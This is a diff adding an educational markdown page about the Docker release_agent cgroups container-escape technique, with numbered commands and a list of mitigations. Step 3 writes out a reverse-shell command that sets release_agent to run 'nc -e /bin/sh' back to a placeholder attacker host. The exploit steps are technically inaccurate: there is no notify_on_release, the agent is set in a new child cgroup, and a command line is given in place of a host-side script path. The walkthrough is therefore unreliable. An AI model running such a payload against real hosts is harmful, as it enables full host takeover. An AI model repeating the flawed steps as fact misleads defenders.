@@ -1,0 +1,107 @@
+# Docker release_agent cgroups escape
+
+
+# 👉 Overview
+
+---
+
+### 👀 What ?
+
+> Docker release_agent cgroups escape is a security exploit that allows an attacker to gain unauthorized access to the host system from a Docker container. Control Groups (cgroups) is a Linux kernel feature to limit, police and account the resource usage for certain system processes, and release_agent is a property of cgroups that specifies a script to execute when the cgroup becomes empty.
+> 
+
+### 🧐 Why ?
+
+> Understanding Docker release_agent cgroups escape is important because it poses a significant security risk. If an attacker can escape from a Docker container to the host system, they can potentially gain full control over the system, access sensitive information, and carry out further attacks. As Docker is widely used in the IT industry, this issue is of particular concern to system administrators and cybersecurity professionals.
+> 
+
+### ⛏️ How ?
+
+> To exploit this vulnerability, an attacker needs to have access to a Docker container and the ability to run commands within it. The attacker can then create a new cgroup, set the release_agent property to the command they want to execute on the host system, and move the Docker process to the new cgroup. When the Docker process exits and the cgroup becomes empty, the release_agent script is executed, resulting in the command being run on the host system. To protect against this exploit, system administrators should restrict container access, regularly update and patch systems, and monitor for suspicious activity.
+> 
+
+### ⏳ When ?
+
+> The Docker release_agent cgroups escape exploit has been known since at least 2016, when it was first reported. Despite patches and updates, variations of this exploit may still be possible on systems that are not properly secured or updated.
+> 
+
+# ⚙️ Technical Explanations
+
+---
+
+### Overview
+
+The Docker release_agent cgroups escape exploit is a critical security vulnerability that leverages the Linux kernel's cgroups (control groups) feature in combination with Docker, a popular containerization platform. This exploit allows a malicious actor to escape from a Docker container and execute arbitrary commands on the host system.
+
+### How the Exploit Works
+
+1. **Understanding cgroups**:
+    - cgroups is a Linux kernel feature that limits, accounts for, and isolates the resource usage (CPU, memory, disk I/O, etc.) of a collection of processes.
+    - One of the properties of cgroups is `release_agent`, which specifies a script to be executed when the cgroup becomes empty.
+2. **Docker and cgroups**:
+    - Docker containers use cgroups to manage and isolate the resources used by the container.
+    - If an attacker gains access to a Docker container, they can potentially manipulate cgroups to escape the container's isolation.
+3. **Exploiting the release_agent**:
+    - By setting the `release_agent` property of a cgroup to a malicious command, an attacker can cause this command to be executed on the host system when the cgroup becomes empty.
+
+### Step-by-Step Example of the Exploit
+
+### Step 1: Gain Access to a Docker Container
+
+The attacker first gains access to a Docker container. This could be done through exploiting a weak password, a software vulnerability, or another method. For instance, using Docker CLI:
+
+```bash
+docker exec -it <container_id> bash
+
+```
+
+### Step 2: Create a New cgroup
+
+Inside the container, the attacker creates a new cgroup. This can be done using the `mkdir` command:
+
+```bash
+mkdir /sys/fs/cgroup/cpu/demo
+
+```
+
+### Step 3: Set the release_agent Property
+
+The attacker sets the `release_agent` property of the new cgroup to a malicious command that they wish to execute on the host system. For example, to create a backdoor, the attacker might set it to open a reverse shell:
+
+```bash
+echo "/bin/sh -c 'nc -e /bin/sh attacker_ip attacker_port'" > /sys/fs/cgroup/cpu/demo/release_agent
+
+```
+
+### Step 4: Move the Docker Process to the New cgroup
+
+The attacker then moves the Docker process to the new cgroup. They can do this by identifying the process ID (PID) of the Docker process and writing it to the `cgroup.procs` file of the new cgroup:
+
+```bash
+echo $$ > /sys/fs/cgroup/cpu/demo/cgroup.procs
+
+```
+
+### Step 5: Trigger the release_agent
+
+When the Docker process exits and the cgroup becomes empty, the `release_agent` script is executed on the host system, not inside the container. As a result, the malicious command specified in step 3 is run on the host system, potentially leading to a full system compromise.
+
+### Mitigation Strategies
+
+1. **Limit Access to Docker Containers**:
+    - Restrict access to Docker containers to only trusted users.
+    - Use strong passwords and authentication mechanisms.
+2. **Regular Updates and Patching**:
+    - Keep the Docker daemon, host operating system, and all software dependencies up-to-date with the latest security patches.
+3. **Monitoring and Auditing**:
+    - Monitor system logs and audit Docker containers for suspicious activity.
+    - Use security tools to detect anomalies and potential breaches.
+4. **Disable Unnecessary Features**:
+    - Disable or restrict the use of features that are not needed, such as the ability to create and manipulate cgroups.
+5. **Implement Security Controls**:
+    - Use AppArmor, SELinux, or other mandatory access control systems to enforce security policies on Docker containers.
+    - Limit the capabilities of containers to the minimum required for their operation.
+
+### Conclusion
+
+The Docker release_agent cgroups escape exploit highlights the importance of securing containerized environments. By understanding how cgroups can be manipulated and taking appropriate mitigation steps, administrators can protect their systems from such exploits. Regular monitoring, updating, and the implementation of robust security controls are essential to maintain a secure Docker environment.
